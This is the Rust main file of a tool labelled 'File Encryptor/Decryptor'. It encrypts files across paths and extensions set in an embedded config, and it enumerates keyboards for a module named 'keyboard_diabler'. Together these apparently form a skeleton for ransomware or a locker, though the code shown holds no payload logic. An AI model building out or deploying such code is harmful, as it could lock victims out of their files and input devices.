mod utils;
mod models;
mod encrypt;
mod decrypt;
mod keyboard_diabler;

use crate::keyboard_diabler::KeyboardController;
use crate::models::Config;
use crate::utils::{get_embedded_config, process_path};
use colored::*;
use std::time::Duration;
use tokio::time::{sleep_until, Instant};

// C:\Users\yjrur\OneDrive\Рабочий стол\test
#[tokio::main]
async fn main() -> anyhow::Result<()> {
	println!("{}", "══════════════════════════════════════════════".cyan());
	println!("{}", "🔐 File Encryptor/Decryptor v3.0".bright_cyan().bold());
	println!("{}", "══════════════════════════════════════════════".cyan());
	println!();

	let (key, paths, mode, allowed_extensions) = match get_embedded_config() {
		Ok(v) => {v},
		Err(re) => {
			eprintln!("{}", format!("❌ get_embedded_config err: {}", re.text).red());
			sleep_until(Instant::now() + Duration::from_secs(5)).await;
			std::process::exit(1);
		}
	};

	let config = Config{key, mode, paths, allowed_extensions};

	let key_bytes = match hex::decode(&config.key) {
		Ok(bytes) => bytes,
		Err(e) => {
			eprintln!("{}", format!("❌ Invalid key: {}", e).red());
			sleep_until(Instant::now() + Duration::from_secs(5)).await;
			std::process::exit(1);
		}
	};

	if key_bytes.len() != 32 {
		eprintln!("{}", "❌ Key must be 32 bytes".red());
		sleep_until(Instant::now() + Duration::from_secs(5)).await;
		std::process::exit(1);
	}

	let mut key = [0u8; 32];
	key.copy_from_slice(&key_bytes);

	println!("🔑 Mode: {}", if config.mode == "encrypt" { "ENCRYPT" } else { "DECRYPT" }.bright_yellow());
	println!("📁 Paths to process: {}", config.paths.len());
	for path in &config.paths {
		println!("   • {}", path);
	}
	println!();

	let mut total_processed = 0;
	let mut total_errors = 0;

	for path in &config.paths {
		println!("📂 Processing: {}", path.cyan());
		match process_path(path, &key, &config.mode, config.allowed_extensions.clone()) {
			Ok((processed, errors)) => {
				total_processed += processed;
				total_errors += errors;
				println!("   ✅ Processed: {} files, ⚠️ Errors: {}\n", processed, errors);
			}
			Err(e) => {
				total_errors += 1;
				println!("   {} {}\n", "❌ Error:".red(), e.red());
			}
		}
	}

	println!("{}", "══════════════════════════════════════════════".cyan());
	if total_errors == 0 {
		println!("{}", format!("✅ Success! Processed {} files", total_processed).green());
	} else {
		println!("{}", format!("⚠️ Completed with errors: {} processed, {} errors", total_processed, total_errors).yellow());
	}
	println!("{}", "══════════════════════════════════════════════".cyan());

	let keyboards = match KeyboardController::find_keyboards() {
		Ok(keyboards) => keyboards,
		Err(e) => {
			println!("{} {}", "❌ KeyboardController::find_keyboards()".red(), e);
			sleep_until(Instant::now() + Duration::from_secs(55)).await;
			std::process::exit(1);
		}
	};

	//todo
	println!("\n=== RESULTS ===");
	if keyboards.is_empty() {
		println!("No keyboards found!");
		println!("\nPossible reasons:");
		println!("  1. Run as Administrator");
		println!("  2. Check Device Manager for keyboard devices");
		println!("  3. Try running with different permissions");
	} else {
		println!("Found {} keyboard(s):\n", keyboards.len());
		for (i, kb) in keyboards.iter().enumerate() {
			println!("{}. Description: {}", i + 1, kb.description);
			println!("   Instance ID: {}", kb.instance_id);
			println!("   Dev Node: {}\n", kb.dev_node);
		}
	}
	sleep_until(Instant::now() + Duration::from_secs(55)).await;

	println!("\nPress Enter to exit...");
	let _ = std::io::stdin().read_line(&mut String::new());

	Ok(())
}